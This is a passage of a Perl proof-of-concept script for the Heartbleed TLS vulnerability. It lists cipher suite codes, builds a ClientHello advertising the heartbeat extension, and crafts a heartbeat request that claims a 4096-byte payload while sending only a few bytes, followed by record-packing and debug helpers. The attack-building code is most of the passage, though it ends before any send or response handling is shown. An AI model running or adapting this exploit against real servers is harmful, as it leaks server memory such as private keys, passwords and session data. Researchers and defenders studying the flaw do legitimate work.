        'C060',        # TLS_ECDHE_RSA_WITH_ARIA_128_GCM_SHA256
        'C061',        # TLS_ECDHE_RSA_WITH_ARIA_256_GCM_SHA384
        'C062',        # TLS_ECDH_RSA_WITH_ARIA_128_GCM_SHA256
        'C063',        # TLS_ECDH_RSA_WITH_ARIA_256_GCM_SHA384
        'C064',        # TLS_PSK_WITH_ARIA_128_CBC_SHA256
        'C065',        # TLS_PSK_WITH_ARIA_256_CBC_SHA384
        'C066',        # TLS_DHE_PSK_WITH_ARIA_128_CBC_SHA256
        'C067',        # TLS_DHE_PSK_WITH_ARIA_256_CBC_SHA384
        'C068',        # TLS_RSA_PSK_WITH_ARIA_128_CBC_SHA256
        'C069',        # TLS_RSA_PSK_WITH_ARIA_256_CBC_SHA384
        'C06A',        # TLS_PSK_WITH_ARIA_128_GCM_SHA256
        'C06B',        # TLS_PSK_WITH_ARIA_256_GCM_SHA384
        'C06C',        # TLS_DHE_PSK_WITH_ARIA_128_GCM_SHA256
        'C06D',        # TLS_DHE_PSK_WITH_ARIA_256_GCM_SHA384
        'C06E',        # TLS_RSA_PSK_WITH_ARIA_128_GCM_SHA256
        'C06F',        # TLS_RSA_PSK_WITH_ARIA_256_GCM_SHA384
        'C070',        # TLS_ECDHE_PSK_WITH_ARIA_128_CBC_SHA256
        'C071',        # TLS_ECDHE_PSK_WITH_ARIA_256_CBC_SHA384
        'C072',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
        'C073',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
        'C074',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_CBC_SHA256
        'C075',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_CBC_SHA384
        'C076',        # TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256
        'C077',        # TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384
        'C078',        # TLS_ECDH_RSA_WITH_CAMELLIA_128_CBC_SHA256
        'C079',        # TLS_ECDH_RSA_WITH_CAMELLIA_256_CBC_SHA384
        'C07A',        # TLS_RSA_WITH_CAMELLIA_128_GCM_SHA256
        'C07B',        # TLS_RSA_WITH_CAMELLIA_256_GCM_SHA384
        'C07C',        # TLS_DHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
        'C07D',        # TLS_DHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
        'C07E',        # TLS_DH_RSA_WITH_CAMELLIA_128_GCM_SHA256
        'C07F',        # TLS_DH_RSA_WITH_CAMELLIA_256_GCM_SHA384
        'C080',        # TLS_DHE_DSS_WITH_CAMELLIA_128_GCM_SHA256
        'C081',        # TLS_DHE_DSS_WITH_CAMELLIA_256_GCM_SHA384
        'C082',        # TLS_DH_DSS_WITH_CAMELLIA_128_GCM_SHA256
        'C083',        # TLS_DH_DSS_WITH_CAMELLIA_256_GCM_SHA384
        'C084',        # TLS_DH_anon_WITH_CAMELLIA_128_GCM_SHA256
        'C085',        # TLS_DH_anon_WITH_CAMELLIA_256_GCM_SHA384
        'C086',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
        'C087',        # TLS_ECDHE_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
        'C088',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_128_GCM_SHA256
        'C089',        # TLS_ECDH_ECDSA_WITH_CAMELLIA_256_GCM_SHA384
        'C08A',        # TLS_ECDHE_RSA_WITH_CAMELLIA_128_GCM_SHA256
        'C08B',        # TLS_ECDHE_RSA_WITH_CAMELLIA_256_GCM_SHA384
        'C08C',        # TLS_ECDH_RSA_WITH_CAMELLIA_128_GCM_SHA256
        'C08D',        # TLS_ECDH_RSA_WITH_CAMELLIA_256_GCM_SHA384
        'C08E',        # TLS_PSK_WITH_CAMELLIA_128_GCM_SHA256
        'C08F',        # TLS_PSK_WITH_CAMELLIA_256_GCM_SHA384
        'C090',        # TLS_DHE_PSK_WITH_CAMELLIA_128_GCM_SHA256
        'C091',        # TLS_DHE_PSK_WITH_CAMELLIA_256_GCM_SHA384
        'C092',        # TLS_RSA_PSK_WITH_CAMELLIA_128_GCM_SHA256
        'C093',        # TLS_RSA_PSK_WITH_CAMELLIA_256_GCM_SHA384
        'C094',        # TLS_PSK_WITH_CAMELLIA_128_CBC_SHA256
        'C095',        # TLS_PSK_WITH_CAMELLIA_256_CBC_SHA384
        'C096',        # TLS_DHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
        'C097',        # TLS_DHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
        'C098',        # TLS_RSA_PSK_WITH_CAMELLIA_128_CBC_SHA256
        'C099',        # TLS_RSA_PSK_WITH_CAMELLIA_256_CBC_SHA384
        'C09A',        # TLS_ECDHE_PSK_WITH_CAMELLIA_128_CBC_SHA256
        'C09B',        # TLS_ECDHE_PSK_WITH_CAMELLIA_256_CBC_SHA384
        'C09C',        # TLS_RSA_WITH_AES_128_CCM
        'C09D',        # TLS_RSA_WITH_AES_256_CCM
        'C09E',        # TLS_DHE_RSA_WITH_AES_128_CCM
        'C09F',        # TLS_DHE_RSA_WITH_AES_256_CCM
        'C0A0',        # TLS_RSA_WITH_AES_128_CCM_8
        'C0A1',        # TLS_RSA_WITH_AES_256_CCM_8
        'C0A2',        # TLS_DHE_RSA_WITH_AES_128_CCM_8
        'C0A3',        # TLS_DHE_RSA_WITH_AES_256_CCM_8
        'C0A4',        # TLS_PSK_WITH_AES_128_CCM
        'C0A5',        # TLS_PSK_WITH_AES_256_CCM
        'C0A6',        # TLS_DHE_PSK_WITH_AES_128_CCM
        'C0A7',        # TLS_DHE_PSK_WITH_AES_256_CCM
        'C0A8',        # TLS_PSK_WITH_AES_128_CCM_8
        'C0A9',        # TLS_PSK_WITH_AES_256_CCM_8
        'C0AA',        # TLS_PSK_DHE_WITH_AES_128_CCM_8
        'C0AB',        # TLS_PSK_DHE_WITH_AES_256_CCM_8
        'C0AC',        # TLS_ECDHE_ECDSA_WITH_AES_128_CCM
        'C0AD',        # TLS_ECDHE_ECDSA_WITH_AES_256_CCM
        'C0AE',        # TLS_ECDHE_ECDSA_WITH_AES_128_CCM_8
        'C0AF',        # TLS_ECDHE_ECDSA_WITH_AES_256_CCM_8
    );

    my $random = q{};
    ### Get random hex bits
    for ( 0 .. 55 ) {
        $random .= ( 0 .. 9, 'a' .. 'f' )[ rand(16) ];
    }
    $ssltls = sprintf( "%04d", 300 + $ssltls + 1 );
    my $hello = join(
        q{},
        (   $ssltls,    # TLS Version
            unpack( "H*", pack( "N*", time() ) ),    # get time for TLS time
            $random,    # stuff random bits for a valid data section
            '00',       # Session ID length (no session id)
            unpack( "H*", pack( "n*", scalar(@ciphers) * 2 ) )
            ,           # Cipher length in bytes
            join( q{}, @ciphers ),    # Add ciphers
            '0100',    # Compression length (01) and method (null)
            '0005',    # Extension data length
            '000f',    # Extension type (heartbeat)
            '0001',    # Extension length
            '01',      # Extension data
        )
    );

    # Prepend data header info
    $hello
        = '0100'
        . unpack( "H*", pack( "n*", length( pack( "H*", $hello ) ) ) )
        . $hello;
    my $record = ssl_record( 'handshake', $ssltls, $hello );
    return $record;
}    # END buildHello

sub buildHeartbeat {
    my $ssltls  = shift @_;
    my $payload = "banana";    # this is the message we send in the request
    my $stuffer
        = "!!Bowties are cool!!"; # the server is supposed to ignore this part

    my $type = '01';              # heartbeat request
    $payload = unpack( "H*", pack( "a*", $payload ) );
    $stuffer = unpack( "H*", pack( "a*", $stuffer ) );

    my $data = $payload . $stuffer;
    ### sometimes servers don't respond when using the max value, also, it's just a PoC
    my $length = '1000';
    $ssltls = sprintf( "%04d", 300 + $ssltls + 1 );
    my $record = ssl_record( 'heartbeat', $ssltls, $type . $length . $data );
    return $record;
}    # End buildHeartbeat

sub ssl_record {
    ### Data is supposed to be in hex form, pack it at the end
    my $type = shift @_;
    my $tls  = shift @_;
    my $data = shift @_;
    if (!(     $type ne '22'
            or $type ne '24'
            or $type ne 'handshake'
            or $type ne 'heartbeat'
            or $type ne '0x16'
            or $type ne '0x18'
        )
        )
    {
        debug( 0, "Error - invalid SSL record type!" );
        return;
    }
    ### Convert type to hex
    if ( $type eq 'handshake' or $type eq '22' ) {
        $type = '0x16';
    }
    elsif ( $type eq 'heartbeat' or $type eq '24' ) {
        $type = '0x18';
    }
    $type =~ s/^0x//i;
    my $length = unpack( "H*", pack( "n*", length($data) / 2 ) );

    my $hex_pack = $type . $tls . $length . $data;
    my $packet = pack( "H*", $hex_pack );
    return $packet;
}    # END ssl_record

sub debug {
    my ( $level, $msg ) = @_;
    my $prefix = q{};
    my @output = ();

    if ( !$msg ) {
        $msg = q{};
    }
    if ( isnull($level) ) {
        return;
    }
    if ( $level and $level !~ /^\d+$/ ) {
        $msg   = $level;
        $level = 0;
    }
    if ( $msg and $msg =~ /\n|\r/ ) {
        @output = split( /\r|\n/, $msg );
    }
    else {
        push @output, $msg;
    }
    if ( $level <= 0 ) {
        $prefix = 'Error: ';
    }
    elsif ( $level == 1 ) {
        $prefix = 'Warn: ';
    }
    else {
        $prefix = 'Debug ' . ( $level - 1 ) . ': ';
    }
    if ( $level <= $debug_level ) {
        foreach my $line (@output) {
            print $prefix . $line . "\n";
        }
    }
}    # END debug

sub isnull {
    my $variable = shift @_;
    if ( !defined($variable) or length($variable) == 0 ) {
        return 1;
    }
    return 0;
}    # END isnull

sub notnull {
    my $variable = shift @_;
    return !isnull $variable;
}    # END notnull

